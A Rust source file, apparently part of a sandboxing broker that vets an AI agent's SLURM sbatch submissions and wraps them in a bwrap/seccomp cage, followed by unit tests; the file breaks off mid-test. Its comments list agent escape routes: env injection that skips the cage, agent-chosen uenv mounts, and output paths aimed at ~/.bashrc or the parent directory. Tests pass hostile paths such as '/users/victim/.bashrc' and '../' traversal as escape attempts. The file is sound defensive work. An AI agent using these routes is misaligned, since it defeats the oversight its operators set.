//! All broker policy lives here. Input is hostile. See BROKER.md.

use crate::protocol::{Request, PROTOCOL_VERSION};
use crate::profile;
use crate::sbatch;
use crate::session::Session;
use crate::settings::{self, FsPolicy};

use husk_slurm_broker::READONLY_SLURM;

pub enum Decision {
    Submit(Submission),
    /// Run a validated read-only query (argv[0] is the command) and return output.
    Query(Vec<String>),
    Reject(String),
}

pub struct Submission {
    /// sbatch options (forced + sanitized passthrough), NOT including the script.
    pub options: Vec<String>,
    pub job_args: Vec<String>,
    /// The script content to stage and submit (snapshot + re-exec guard).
    pub wrapped_script: String,
}

pub fn decide(req: &Request, session: &Session, fs: &FsPolicy) -> Decision {
    if req.version != PROTOCOL_VERSION {
        return Decision::Reject(format!("unsupported protocol version {}", req.version));
    }
    // Tool dispatch: sbatch is brokered (below); Tier-1 read-only queries run
    // as-is; everything else (srun/salloc, state-changing commands) is rejected.
    match req.tool.as_str() {
        "sbatch" => {} // fall through to the submission flow
        t if READONLY_SLURM.contains(&t) => {
            let mut argv = vec![req.tool.clone()];
            argv.extend(req.argv.iter().cloned());
            return Decision::Query(argv);
        }
        other => {
            return Decision::Reject(format!(
                "'{other}' is not brokered (only sbatch and read-only SLURM queries; \
                 interactive srun/salloc and state-changing commands are disabled)"
            ));
        }
    }

    // Confine the working directory: it is forced as --chdir and bound WRITABLE into the
    // compute cage, so reject `/`, homes under HIDDEN_FLOOR, and traversal — otherwise the
    // job re-mounts root read-write or re-exposes a home inside the cage. (F15/F19)
    if !settings::is_workdir_allowed(&req.cwd) {
        return Decision::Reject(format!(
            "Working directory {:?} is not allowed. Submit the job from a scratch/project \
             directory (an absolute path, not '/' and not under a hidden home like /users).",
            req.cwd
        ));
    }

    // Normalize getopt-glued short options (`-o/path`, `-ppancake`) into separate tokens
    // BEFORE parsing, so a glued form can't slip past the gate (F14) or the strip (F13).
    let cli = sbatch::option_tokens(&sbatch::split_glued_short_opts(&req.argv));
    let directives = sbatch::sbatch_directives(&req.script.body);

    // ---- partition: must resolve to the site's forced partition, else reject + teach ----
    // The required partition is site-specific (HUSK_SLURM_PARTITION, default preemptible);
    // Balfrin has `preemptible`, Santis does not, so it is not hard-coded.
    let required = session.required_partition.as_str();
    let partition = sbatch::option_value(&cli, &["-p", "--partition"])
        .or_else(|| sbatch::option_value(&directives, &["-p", "--partition"]));
    match partition.as_deref() {
        Some(p) if p == required => {}
        _ => {
            return Decision::Reject(format!(
                "Only --partition={required} is permitted here. Resubmit with \
                 --partition={required}. It is the partition all brokered jobs run on \
                 (typically preemptible/low-priority, so checkpoint your work)."
            ));
        }
    }

    // ---- topology: pick the cage profile, and force it rather than infer it ----
    // Checked across CLI *and* #SBATCH, like the partition: a body directive would reach
    // slurmd, and `--nodes` is Forced in the registry so the agent's own token never
    // survives to the real command line. The profile then EMITS `--nodes=1` below, which
    // is what makes the single-node cage true by construction — reading the request is not
    // enough, since `--ntasks N` alone lets the scheduler spread tasks over nodes.
    let requested_nodes = sbatch::option_value(&cli, &["-N", "--nodes"])
        .or_else(|| sbatch::option_value(&directives, &["-N", "--nodes"]));
    let profile = match profile::Profile::select(requested_nodes.as_deref()) {
        Ok(p) => p,
        Err(reason) => return Decision::Reject(reason),
    };

    // ---- uenv: inherited from the launching session; the agent may NOT choose it ----
    // The broker forces --uenv/--view from the trusted session (below) and never uses
    // --repo. A #SBATCH directive in the body is not rewritten, so an agent-supplied uenv
    // selection the broker doesn't force-override — a body --repo, or --uenv/--view when no
    // session uenv is loaded — would reach slurmstepd and mount an agent-chosen squashfs as
    // root. Detect across CLI + #SBATCH + SBATCH_* env and reject fail-closed, rather than
    // try to strip the body (which would re-implement sbatch's parser). (F26)
    let agent_sel = |names: &[&str], env_key: &str| {
        sbatch::option_value(&cli, names)
            .or_else(|| sbatch::option_value(&directives, names))
            .or_else(|| req.env.get(env_key).cloned())
    };
    if agent_sel(&["--repo"], "SBATCH_UENV_REPO").is_some() {
        return Decision::Reject(
            "You may not set --repo: the uenv repository is inherited from the launching \
             session. Remove --repo (and any #SBATCH --repo) from your submission."
                .to_string(),
        );
    }
    // The agent may name the session's own uenv/view (redundant, harmless), but not a
    // different one, and not any when no session uenv is loaded.
    let overrides = |agent: Option<String>, sess: Option<&String>| match (agent, sess) {
        (Some(a), Some(s)) => a != *s,
        (Some(_), None) => true,
        _ => false,
    };
    if overrides(agent_sel(&["--uenv"], "SBATCH_UENV"), session.uenv.as_ref())
        || overrides(agent_sel(&["--view"], "SBATCH_UENV_VIEW"), session.view.as_ref())
    {
        return Decision::Reject(format!(
            "uenv is inherited from the launching session and cannot be changed by the job. \
             {}Remove --uenv/--view/--repo (both CLI and #SBATCH) from your submission.",
            match session.uenv.as_ref() {
                Some(s) => format!("You are running in '{s}'. "),
                None => "This session has no uenv loaded. ".to_string(),
            }
        ));
    }

    // ---- body directives: reject dangerous / unrecognised #SBATCH lines ----
    // The body is submitted verbatim, so a #SBATCH directive reaches slurmd directly.
    // We don't rewrite it (that = re-implementing sbatch's parser); we detect-and-reject
    // any Forced option (except the dedicated partition/uenv/view/repo handled above),
    // any option not on the allowlist, and burst-buffer/DataWarp lines. (F24 body path,
    // and the general "a directive we don't model could be the next escape" rule.)
    if let Some(reason) = sbatch::body_reject_reason(&req.script.body) {
        return Decision::Reject(reason);
    }

    // ---- forced options (these outrank any #SBATCH directive: CLI > directive) ----
    let mut options: Vec<String> = Vec::new();
    options.push(format!("--partition={required}"));
    // The cage profile's own forced options (today: --nodes=1). Emitted with the other
    // forced values, before the validated passthrough, so they outrank any #SBATCH.
    options.extend(profile.forced_sbatch_options());
    if let Some(u) = &session.uenv {
        options.push(format!("--uenv={u}"));
        // Force a NORMALIZED `--view` (uenvname:viewname). Raw UENV_VIEW is mount-qualified
        // (e.g. `/user-environment:icon:default`) and invalid as a `--view` argument;
        // session.rs strips the /mount-point prefix. Verified on Balfrin (8.1) + Santis
        // (10.0.1): this restores the job's UENV_VIEW marker; the live view PATH comes from
        // --export=ALL below, not from --view.
        if let Some(v) = &session.view {
            options.push(format!("--view={v}"));
        }
    }
    // Force --export=ALL on the CLI in BOTH cases (CLI outranks any `#SBATCH --export`).
    // It inherits the broker's TRUSTED login env — which activates the uenv view when one
    // is loaded, and provides PATH/modules (incl. seccomp-wrapper/bwrap for the guard) when
    // not — AND, crucially, overrides an agent `#SBATCH --export=...` in the body, closing
    // the injection of `_HUSK_RESANDBOXED=1` that would make the re-exec guard skip the cage
    // (F24). The broker's env is agent-free; the compute cage `--unsetenv`s configured
    // credentials + `--unshare-net`s the job. (AV7 caveat: env secrets NOT listed in
    // credentials.envVars still reach the caged, network-off job — widen that list to mask.)
    options.push("--export=ALL".to_string());
    // ---- chdir / output / error: the job MAY choose, CONFINED to the workdir subtree ----
    //
    // These stay forced BY CONSTRUCTION — husk always emits its own value on the real
    // command line, which outranks any `#SBATCH` — but the value may now come from the
    // request. Real run scripts depend on it: ICON writes
    // `#SBATCH --output=<case>/run/LOG.<exp>.%j.o` and expects its logs there, and every
    // HPC workflow built around finding files by name was broken by a forced
    // `slurm-%j.out`.
    //
    // Why this is safe, and why it needed care. `--output`/`--error` name a file that
    // *slurmd* writes AS THE USER and OUTSIDE the cage, so an unconfined value is an
    // uncaged arbitrary-write primitive (job stdout into ~/.bashrc, or a .git/hooks file:
    // AV2 with the cage bypassed). `--chdir` names a directory the job starts in.
    // Confining both to the workdir subtree grants nothing new — that subtree is already
    // bound writable into the cage — while letting the workflow put its files where it
    // wants them. The CAGE IS UNCHANGED by this: the writable bind is still `cwd`.
    //
    // Read from the CLI first, then the body, exactly like --partition: the agent's own
    // token is dropped by the registry (both remain `Class::Forced`), so the string below
    // is one husk validated and re-emitted, never one forwarded into slurmd's parser.
    let cwd = req.cwd.clone();
    let pick = |names: &[&str]| {
        sbatch::option_value(&cli, names).or_else(|| sbatch::option_value(&directives, names))
    };

    let chdir = match pick(&["-D", "--chdir"]) {
        None => cwd.clone(),
        Some(d) => match settings::confine_under_workdir(&d, &cwd) {
            Ok(p) => p,
            Err(why) => return Decision::Reject(format!("--chdir: {why}")),
        },
    };
    // Output paths are resolved against the JOB's working directory, which is what a
    // relative `--output=logs/x.out` means to SLURM.
    let out = match pick(&["-o", "--output"]) {
        None => format!("{chdir}/slurm-%j.out"),
        Some(v) => match settings::confine_output_pattern(&v, &chdir) {
            Ok(p) => p,
            Err(why) => return Decision::Reject(format!("--output: {why}")),
        },
    };
    let err = match pick(&["-e", "--error"]) {
        None => format!("{chdir}/slurm-%j.err"),
        Some(v) => match settings::confine_output_pattern(&v, &chdir) {
            Ok(p) => p,
            Err(why) => return Decision::Reject(format!("--error: {why}")),
        },
    };
    options.push(format!("--chdir={chdir}"));
    options.push(format!("--output={out}"));
    options.push(format!("--error={err}"));

    // ---- resource options: ALLOWLIST, not passthrough ----
    // Interpret the agent's CLI against the option registry: Forced/Ignored options
    // (partition/uenv/view/repo/output/error/chdir/export/wrap, mail, …) are dropped
    // (the broker forces its own above), benign resource options are validated and
    // RE-EMITTED canonically, and anything unrecognised or invalid is REJECTED. No raw
    // agent token reaches slurmd — so glued shorts, `--wrap`, `#SBATCH`-only channels
    // and unknown/next-year options fail closed by construction, not open. This retires
    // the whole F13/F14/F24/F26/F27 class rather than the instances. See THREAT-MODEL.md
    // "Design principle (the gate)".
    match sbatch::interpret_cli(&cli) {
        Ok(resource_opts) => options.extend(resource_opts),
        Err(reason) => return Decision::Reject(reason),
    }

    // Compute-side cage: derive the bwrap profile from the (trusted) resolved
    // sandbox.filesystem policy, hiding homes and re-exposing the human's carve-outs.
    // `cwd` is the forced --chdir dir, bound writable for job output.
    let bwrap_args = fs.compute_bwrap_args(&cwd);

    // Does this job get an egress proxy at all? Only if the operator configured an
    // allowlist. Resolved at SUBMIT time so the guard carries no policy of its own - the
    // proxy re-reads the same files on the compute node, and this only decides whether to
    // start one. An unparseable allowlist is treated as "no network" here rather than
    // failing the submission: the proxy reports the error where an operator will see it,
    // and a job that runs without egress is better than a job that will not run at all.
    let net_enabled = crate::netallow::Allowlist::resolve(
        &std::env::var_os("HOME").map(std::path::PathBuf::from).unwrap_or_default(),
        std::path::Path::new(&cwd),
    )
    .map(|(a, _)| !a.is_empty())
    .unwrap_or(false);

    Decision::Submit(Submission {
        options,
        job_args: req.job_args.clone(),
        wrapped_script: wrap_script(&req.script.body, &bwrap_args, profile, &cwd, net_enabled),
    })
}

/// Inject a re-exec guard so the job runs once under the compute-side sandbox.
/// The guard is placed AFTER the leading comment/#SBATCH block so sbatch still
/// parses the agent's resource directives (they sit at the top), and BEFORE the
/// first command so the re-exec happens before any agent code runs. `bwrap_args`
/// is the compute-side profile derived from the resolved sandbox.filesystem policy
/// (see settings::FsPolicy::compute_bwrap_args).
///
/// TODO(hardware/MPI): the network/fabric policy is still single-node only —
/// `--unshare-net` breaks multi-node/MPI (no fabric); revisit for the MPI phase.
/// Confirm the uenv /user-environment mount inherits through `--ro-bind / /`.
/// Where this broker and the srun stub live, derived from our own path
/// (`<prefix>/bin/husk-slurm-broker` -> `<prefix>/lib/husk/srun-stub.py`, the layout
/// install-husk.sh creates). Self-configuring: no new knob to set, and no agent input.
///
/// Both are only ever USED behind a runtime existence test in the guard, because the
/// broker resolves them on the LOGIN node while the guard runs on a compute node — the
/// same submit-side/run-side split that made the GPU binds `--dev-bind-try`.
fn husk_paths() -> (String, String, String) {
    let exe = std::env::current_exe().unwrap_or_default();
    let broker = exe.to_string_lossy().to_string();
    let prefix = exe.parent().and_then(|bin| bin.parent());
    let stub = prefix
        .map(|p| p.join("lib").join("husk").join("srun-stub.py"))
        .unwrap_or_default()
        .to_string_lossy()
        .to_string();
    // `install-husk.sh` builds socat into <prefix>/bin/socat when the system has none.
    // That lives under the user's HOME, which the cage tmpfs-masks (HIDDEN_FLOOR), so it
    // is invisible exactly where the egress relay needs it — the failure that made the
    // first hardware run of the network feature come up empty. The guard binds it in.
    let socat = prefix
        .map(|p| p.join("bin").join("socat"))
        .unwrap_or_default()
        .to_string_lossy()
        .to_string();
    (broker, stub, socat)
}

fn wrap_script(
    body: &str,
    bwrap_args: &[String],
    profile: profile::Profile,
    workdir: &str,
    net_enabled: bool,
) -> String {
    let mut head = String::new();
    let mut tail = String::new();
    let mut in_head = true;
    for line in body.lines() {
        if in_head {
            let t = line.trim_start();
            if t.is_empty() || t.starts_with('#') {
                head.push_str(line);
                head.push('\n');
                continue;
            }
            in_head = false;
        }
        tail.push_str(line);
        tail.push('\n');
    }
    if !head.starts_with("#!") {
        head = format!("#!/bin/bash\n{head}");
    }

    let bwrap = bwrap_args
        .iter()
        .map(|s| settings::sh_quote(s))
        .collect::<Vec<_>>()
        .join(" ");
    // Great A'Tuin.
    //
    // Deliberately NOT `exec`: the guard shell stays alive as the parent so it can
    // TRANSLATE a seccomp kill. seccomp-wrapper blocks with SCMP_ACT_KILL_PROCESS, so a
    // blocked syscall kills the job with SIGSYS -> status 159 and a bare "Bad system
    // call". Interactively that is fine (the agent reads the failure and adapts); in a
    // batch job nobody is reading, and a run that dies hours in would give the scientist
    // no way to connect 159 to husk. One idle shell for the job's duration buys a
    // message that names the layer. The status is re-emitted unchanged so sacct still
    // records what really happened.
    //
    // The message points at strace, NOT at SECCOMP_WRAPPER_DEBUG. That variable swaps
    // KILL for ENOSYS, so blocked syscalls return and the program continues — an
    // off-switch, not a diagnostic. A diagnostic may change what we OBSERVE, never what
    // we ENFORCE (the same reason the broker has --dry-run and not a debug mode). Under
    // strace the filter still kills; strace just shows the call it died attempting, right
    // before `+++ killed by SIGSYS +++`. The broker also strips the variable from the
    // submission env (STRIPPED_SUBMIT_ENV), so no brokered job can run weakened.
    // Credential-socket masks are resolved HERE, on the compute node, not baked into the
    // static args: `--tmpfs DEST` dies if DEST is absent under a read-only root, and
    // dies again if two entries resolve to the same directory (/var/run -> /run). Only
    // the compute node knows which exist — same reason the GPU binds use --dev-bind-try.
    // Appended AFTER {bwrap} so it still wins over any config-driven allowRead.
    let mask_paths = settings::CREDENTIAL_SOCKET_DIRS.join(" ");
    let sec = profile.seccomp_profile();
    let (broker_path, stub_path, socat_path) = husk_paths();
    let broker_q = settings::sh_quote(&broker_path);
    let stub_q = settings::sh_quote(&stub_path);
    let socat_q = settings::sh_quote(&socat_path);
    // The SESSION workdir, not `$PWD`. The two used to be identical because --chdir was
    // forced to req.cwd; now a run script may start the job in a subdirectory, and using
    // `$PWD` would silently NARROW the rank cage's writable region to that subdirectory.
    // ICON starts in <case>/run and writes into <case>/experiments — with `$PWD` those
    // writes fail, and nothing says why. The cage boundary must follow the workdir the
    // broker validated, never wherever the job happens to have chdir'd.
    let workdir_q = settings::sh_quote(workdir);

    // ---- egress: the proxy outside the cage, the relay inside it -------------------
    //
    // Emitted ONLY when the operator configured an allowlist. With none, a job keeps
    // today's behaviour exactly - `--unshare-net` and no route at all - and no process is
    // started to serve a policy that permits nothing.
    //
    // The socket lives in the step spool, which is inside the workdir, which the cage
    // already binds writable. So nothing needs a special bind-mount: a unix socket crosses
    // the network namespace because it is a filesystem object, and it arrives on a mount
    // the job already had. Same reasoning that makes the /run/munge mask load-bearing
    // rather than a syscall filter.
    //
    // Raw strings: these are shell, and escaping shell inside an escaped Rust literal is
    // how the srun bind shipped with literal quotes in it and took every job down.
    let (net_start, net_relay) = if net_enabled {
        (
            r#"  # The relay needs socat INSIDE the cage, and husk's own socat lives under
  # <prefix>/bin — i.e. in the user's HOME, which the cage tmpfs-masks. So bind it in,
  # read-only, over an empty file in the spool. A COPY would also work and would be
  # simpler, but the spool sits inside the writable workdir, so a copy is something the
  # job can overwrite; a read-only bind is not. The bind lands in _husk_extra, which is
  # appended last, so it wins over the workdir bind - the same ordering the MUNGE mask
  # depends on. A system-wide socat, if the node has one, is used as-is.
  _husk_socat=
  if command -v socat >/dev/null 2>&1; then
    _husk_socat=$(command -v socat)
  elif [ -x {socat_q} ] && [ -n "$_husk_spool" ]; then
    if : >"$_husk_spool/socat" 2>/dev/null; then
      _husk_socat="$_husk_spool/socat"
      _husk_extra+=(--ro-bind {socat_q} "$_husk_socat")
    fi
  fi
  if [ -n "$_husk_socat" ]; then
    export HUSK_SOCAT="$_husk_socat"
  else
    echo "husk: no socat available, so this job gets no network. husk builds one at" >&2
    echo "husk:   {socat_q}" >&2
    echo "husk: but the cage hides /users, so it must be bound in - and the spool was" >&2
    echo "husk: not usable here. Install socat system-wide on the compute nodes, or" >&2
    echo "husk: re-run install-husk.sh." >&2
  fi
  # Egress proxy: OUTSIDE the cage, holding the allowlist. It resolves the
  # policy from the settings files itself rather than being handed it, so what is in
  # force never depends on a string carried on a command line.
  #
  # Started BEFORE the step-broker on purpose: the step-broker inherits HUSK_NET_SOCK and
  # passes it to each rank, so the socket path has ONE origin instead of being rebuilt
  # from the job id in two places that could drift.
  if [ -n "$_husk_spool" ]; then
    _husk_net_sock="$_husk_spool/net.sock"
    "$_husk_broker" --net-proxy --socket "$_husk_net_sock" --workdir "$PWD"       >>"$_husk_spool/net-proxy.log" 2>&1 &
    _husk_net_pid=$!
    export HUSK_NET_SOCK="$_husk_net_sock"
  fi
"#,
            // Inside the cage. The relay is a byte-shuffler with no policy in it - every
            // decision was made outside. It binds LOOPBACK ONLY, which is all the netns
            // has: bwrap brings `lo` up and there is no other route (both measured).
            r#"# --- injected by husk-slurm-broker: egress relay into the cage ---
if [ -n "${HUSK_NET_SOCK:-}" ] && command -v socat >/dev/null 2>&1; then
  socat TCP-LISTEN:3128,fork,reuseaddr,bind=127.0.0.1 UNIX-CONNECT:"$HUSK_NET_SOCK"     >/dev/null 2>&1 &
  export HTTP_PROXY=http://127.0.0.1:3128 HTTPS_PROXY=http://127.0.0.1:3128
  export http_proxy=http://127.0.0.1:3128 https_proxy=http://127.0.0.1:3128
  export ALL_PROXY=http://127.0.0.1:3128 all_proxy=http://127.0.0.1:3128
  export NO_PROXY=localhost,127.0.0.1 no_proxy=localhost,127.0.0.1
elif [ -n "${HUSK_NET_SOCK:-}" ]; then
  echo "husk: socat is not installed on this node, so this job has no network" >&2
fi
"#,
        )
    } else {
        ("", "")
    };
    let guard = format!(
        "\
# --- injected by husk-slurm-broker: re-exec once inside the compute-side sandbox ---\n\
if [ -z \"${{_HUSK_RESANDBOXED:-}}\" ]; then\n\
  export _HUSK_RESANDBOXED=1\n\
  # An ARRAY, not a string. A string of pre-quoted arguments expanded unquoted gets\n\
  # word-split but NOT quote-removed, so bwrap would receive a path with literal quotes\n\
  # in it - which is exactly how the srun bind below took every job down once.\n\
  _husk_extra=()\n\
  _husk_seen=\n\
  for _d in {mask_paths}; do\n\
    [ -d \"$_d\" ] || continue\n\
    _r=$(readlink -f \"$_d\" 2>/dev/null || echo \"$_d\")\n\
    case \" $_husk_seen \" in *\" $_r \"*) continue ;; esac\n\
    _husk_seen=\"$_husk_seen $_r\"\n\
    _husk_extra+=(--tmpfs \"$_r\")\n\
  done\n\
  # Bootstrap the step pair: an UN-CAGED step-broker (it needs MUNGE and the daemon\n\
  # route, which is exactly what the cage removes) plus the in-cage srun stub bound over\n\
  # the real srun. Everything is conditional on the pieces existing HERE, on this node:\n\
  # the broker resolved these paths on the login node, and a bwrap bind whose source is\n\
  # missing kills the cage outright. If any of it is absent the job still runs - srun\n\
  # simply is not brokered, and fails in the cage for want of a route, which is the\n\
  # status quo. The stub is convenience, not containment.\n\
  # The job spool. Hoisted OUT of the step-pair block below: it holds the step spool AND\n\
  # the egress socket, and a job with no srun stub must still be able to have a network.\n\
  # Coupling egress to the stub would have made an inactive step pair silently mean no\n\
  # network either.\n\
  _husk_spool={workdir_q}\"/.husk-step-spool-${{SLURM_JOB_ID:-nojob}}\"\n\
  mkdir -p \"$_husk_spool\" 2>/dev/null || _husk_spool=\n\
  # Hoisted with the spool, and for the same reason: BOTH the egress proxy and the\n\
  # step-broker are started from it, and the proxy now starts first. Leaving this in the\n\
  # step-pair block below made the proxy line expand to an EMPTY command - the guard said\n\
  # only \"line 43: : command not found\", no proxy ever ran, and three network arms failed\n\
  # for a reason none of them could see (Balfrin 4987657).\n\
  _husk_broker={broker_q}\n\
{net_start}  _husk_step_pid=\n\
  _husk_stub={stub_q}\n\
  _husk_real_srun=$(command -v srun 2>/dev/null || true)\n\
  if [ -r \"$_husk_stub\" ] && [ -x \"$_husk_broker\" ] && [ -n \"$_husk_real_srun\" ]; then\n\
    if [ -n \"$_husk_spool\" ]; then\n\
      export HUSK_STEP_SPOOL=\"$_husk_spool\"\n\
      \"$_husk_broker\" --step-broker --spool \"$_husk_spool\" --workdir {workdir_q} \\\n\
        >\"$_husk_spool/step-broker.log\" 2>&1 &\n\
      _husk_step_pid=$!\n\
      _husk_extra+=(--ro-bind \"$_husk_stub\" \"$_husk_real_srun\")\n\
    fi\n\
  else\n\
    # SAY SO. Continuing is the right call - the stub is convenience, not containment -\n\
    # but doing it silently means a job where srun is NOT brokered looks exactly like one\n\
    # where it is, until srun fails inside the cage with a scheduler error about an\n\
    # expired allocation. That is what a real srun does with MUNGE masked and no route,\n\
    # and diagnosing it from the message alone costs a bring-up round (2026-07-31).\n\
    echo \"husk: srun is NOT brokered in this job - the step pair is inactive\" >&2\n\
    echo \"husk:   stub=$_husk_stub\" >&2\n\
    echo \"husk:   broker=$_husk_broker\" >&2\n\
    echo \"husk:   srun=${{_husk_real_srun:-<not found on this node>}}\" >&2\n\
    echo \"husk:   a real srun in the cage cannot reach slurmctld; run husk from its\" >&2\n\
    echo \"husk:   installed prefix so <prefix>/lib/husk/srun-stub.py resolves\" >&2\n\
  fi\n\
  seccomp-wrapper --profile={sec} bwrap {bwrap} ${{_husk_extra[@]+\"${{_husk_extra[@]}}\"}} -- /bin/bash \"$0\" \"$@\"\n\
  _husk_rc=$?\n\
  # The step-broker holds the credentials the job must not have, so it dies WITH the job.\n\
  # It also sets PR_SET_PDEATHSIG, so this is the belt to that pair of braces.\n\
  [ -n \"$_husk_step_pid\" ] && kill \"$_husk_step_pid\" 2>/dev/null\n\
  # Remove the step spool. It is per-JOB and worthless once the job is over, but it is\n\
  # created in the user's working directory, so leaving one behind per job turns an\n\
  # active project directory into a litter tray. Deleted by exact name, never a glob:\n\
  # this runs with the user's rights in a directory the agent can write, so a pattern\n\
  # would be a deletion primitive pointed at whatever else matched. Kept when the\n\
  # step-broker logged something, because that log is the only record of why a step\n\
  # failed.\n\
  if [ -n \"$_husk_spool\" ] && [ -d \"$_husk_spool\" ]; then\n\
    if [ -s \"$_husk_spool/step-broker.log\" ]; then\n\
      echo \"husk: kept $_husk_spool (the step-broker logged something)\" >&2\n\
    else\n\
      rm -f \"$_husk_spool/step-broker.log\" 2>/dev/null\n\
      rm -f \"$_husk_spool\"/req-*.json \"$_husk_spool\"/resp-*.json 2>/dev/null\n\
      rmdir \"$_husk_spool\" 2>/dev/null\n\
    fi\n\
  fi\n\
  if [ \"$_husk_rc\" = 159 ]; then\n\
    echo \"husk: job killed by SIGSYS - a syscall blocked by husk's seccomp-wrapper.\" >&2\n\
    echo \"husk: to identify which one, re-run the job with your command wrapped in\" >&2\n\
    echo \"husk:   strace -f -o trace.log <your command>\" >&2\n\
    echo \"husk: the cage stays fully enforcing; the last call before the SIGSYS kill in\" >&2\n\
    echo \"husk: trace.log is the blocked one. Send it to us if it should be allowed.\" >&2\n\
  fi\n\
  exit \"$_husk_rc\"\n\
fi\n\
{net_relay}# --- original agent script ---\n"
    );

    format!("{head}{guard}{tail}")
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::protocol::Script;
    use std::collections::BTreeMap;

    fn req(argv: &[&str], body: &str) -> Request {
        Request {
            version: PROTOCOL_VERSION,
            id: "t".into(),
            tool: "sbatch".into(),
            submitted_at: String::new(),
            cwd: "/work".into(),
            argv: argv.iter().map(|s| s.to_string()).collect(),
            script: Script { source: "file".into(), name: None, body: body.into() },
            job_args: vec![],
            env: BTreeMap::new(),
        }
    }
    /// A request whose working directory is a REAL directory, which the confinement
    /// checks require: they resolve paths on disk and follow symlinks, because slurmd
    /// does. `/work` in the other tests is fine only for the paths that never resolve.
    fn req_in(dir: &std::path::Path, argv: &[&str], body: &str) -> Request {
        let mut r = req(argv, body);
        r.cwd = dir.to_string_lossy().to_string();
        r
    }

    /// A workdir laid out like an ICON case: `<w>/run` for logs.
    fn icon_workdir(tag: &str) -> std::path::PathBuf {
        let d = std::env::temp_dir().join(format!("husk-out-{}-{tag}", std::process::id()));
        let _ = std::fs::remove_dir_all(&d);
        std::fs::create_dir_all(d.join("run")).unwrap();
        d
    }

    #[test]
    fn a_run_script_may_put_its_logs_where_it_wants_inside_the_workdir() {
        // The ICON shape, and the whole point of the change: HPC workflows find files by
        // name, so a forced slurm-%j.out in the wrong directory is not cosmetic to them.
        // Note `/./` in the middle — real run scripts generate paths like this.
        let w = icon_workdir("icon");
        let body = format!(
            "#!/bin/bash\n#SBATCH --partition=preemptible\n\
             #SBATCH --job-name=exp.mch_icon-ch1_small.run\n\
             #SBATCH --chdir={w}/./run\n\
             #SBATCH --output={w}/./run/LOG.exp.mch_icon-ch1_small.run.%j.o\n\
             #SBATCH --error={w}/./run/LOG.exp.mch_icon-ch1_small.run.%j.o\necho hi\n",
            w = w.display()
        );
        let o = opts(req_in(&w, &[], &body), &no_uenv());
        let run = std::fs::canonicalize(w.join("run")).unwrap();
        assert!(has(&o, &format!("--chdir={}", run.display())), "{o:?}");
        assert!(
            has(&o, &format!("--output={}/LOG.exp.mch_icon-ch1_small.run.%j.o", run.display())),
            "the script's own log path must survive: {o:?}"
        );
        assert!(
            has(&o, &format!("--error={}/LOG.exp.mch_icon-ch1_small.run.%j.o", run.display())),
            "{o:?}"
        );
        let _ = std::fs::remove_dir_all(&w);
    }

    #[test]
    fn output_paths_that_escape_the_workdir_are_refused() {
        // Each of these is an uncaged write outside the job's blast radius, because
        // slurmd performs the write as the user and outside the sandbox.
        let w = icon_workdir("escape");
        // A symlink INSIDE the workdir pointing out of it: a string prefix check would
        // pass this, which is why confinement canonicalises instead.
        #[cfg(unix)]
        let _ = std::os::unix::fs::symlink("/tmp", w.join("out"));
        for bad in [
            format!("{}/../escaped.log", w.display()), // traversal
            format!("{}/out/escaped.log", w.display()), // via symlink
            "/users/victim/.bashrc".to_string(),        // absolute, elsewhere
        ] {
            let d = decide(
                &req_in(&w, &["--partition=preemptible", &format!("--output={bad}")], "echo hi\n"),
                &no_uenv(),
                &FsPolicy::default(),
            );
            assert!(
                matches!(d, Decision::Reject(_)),
                "must refuse an output path escaping the workdir: {bad}"
            );
        }
        let _ = std::fs::remove_dir_all(&w);
    }

    #[test]
    fn the_job_name_specifier_is_not_allowed_in_an_output_path() {
        // THE PARSER DIFFERENTIAL. slurmd expands %x AFTER husk has validated the string,
        // and the job name is agent-supplied — `v_name` permits dots, so a job named `..`
        // turns <workdir>/%x into the workdir's PARENT. Validating a string that someone
        // else expands is the F13/F14 shape; the specifier is excluded rather than
        // reasoned about.
        let w = icon_workdir("spec");
        for bad in ["%x/log.o", "run/%x.o", "%q.o"] {
            let d = decide(
                &req_in(
                    &w,
                    &["--partition=preemptible", &format!("--output={}/{bad}", w.display())],
                    "echo hi\n",
                ),
                &no_uenv(),
                &FsPolicy::default(),
            );
            assert!(matches!(d, Decision::Reject(_)), "must refuse {bad}");
        }
        let _ = std::fs::remove_dir_all(&w);
    }

    #[test]
    fn a_specifier_in_a_directory_component_is_refused_rather_than_guessed() {
        // husk cannot resolve a directory it cannot expand, and validating the
        // unexpanded string would be validating something other than what slurmd opens.
        let w = icon_workdir("dirspec");
        let d = decide(
            &req_in(
                &w,
                &["--partition=preemptible", &format!("--output={}/%j/log.o", w.display())],
                "echo hi\n",
            ),
            &no_uenv(),
            &FsPolicy::default(),
        );
        match d {
            Decision::Reject(why) => assert!(why.contains("DIRECTORY"), "{why}"),
            _ => panic!("a % specifier in a directory component must be refused"),
        }
        let _ = std::fs::remove_dir_all(&w);
    }

    #[test]
    fn a_chdir_outside_the_workdir_is_refused() {
        let w = icon_workdir("chdir");
        let d = decide(
            &req_in(&w, &["--partition=preemptible", "--chdir=/tmp"], "echo hi\n"),
            &no_uenv(),
            &FsPolicy::default(),
        );
        assert!(matches!(d, Decision::Reject(_)), "--chdir must stay inside the workdir");
        let _ = std::fs::remove_dir_all(&w);
    }

    fn no_uenv() -> Session {
        Session { uenv: None, view: None, required_partition: "preemptible".into() }
    }
    fn with_uenv() -> Session {
        Session {
            uenv: Some("prgenv-gnu:v1".into()),
            view: Some("prgenv-gnu:default".into()),
            required_partition: "preemptible".into(),
        }
    }
    fn opts(r: Request, s: &Session) -> Vec<String> {
        match decide(&r, s, &FsPolicy::default()) {
            Decision::Submit(sub) => sub.options,
            Decision::Reject(m) => panic!("expected Submit, got Reject: {m}"),
            Decision::Query(a) => panic!("expected Submit, got Query: {a:?}"),
        }
    }
    fn rejected(r: Request, s: &Session) -> bool {
        matches!(decide(&r, s, &FsPolicy::default()), Decision::Reject(_))
    }
    fn has(o: &[String], s: &str) -> bool {
        o.iter().any(|x| x == s)
    }
    fn has_prefix(o: &[String], p: &str) -> bool {
        o.iter().any(|x| x.starts_with(p))
    }

    #[test]
    fn rejects_wrong_protocol_version() {
        let mut r = req(&["--partition=preemptible"], "echo hi\n");
        r.version = 999;
        assert!(rejected(r, &no_uenv()));
    }

    #[test]
    fn rejects_non_sbatch_tool() {
        let mut r = req(&["--partition=preemptible"], "echo hi\n");
        r.tool = "srun".into();
        assert!(rejected(r, &no_uenv()));
    }

    #[test]
    fn readonly_slurm_command_becomes_a_pass_through_query() {
        let mut r = req(&["-u", "cmueller", "--me"], "");
        r.tool = "squeue".into();
        match decide(&r, &no_uenv(), &FsPolicy::default()) {
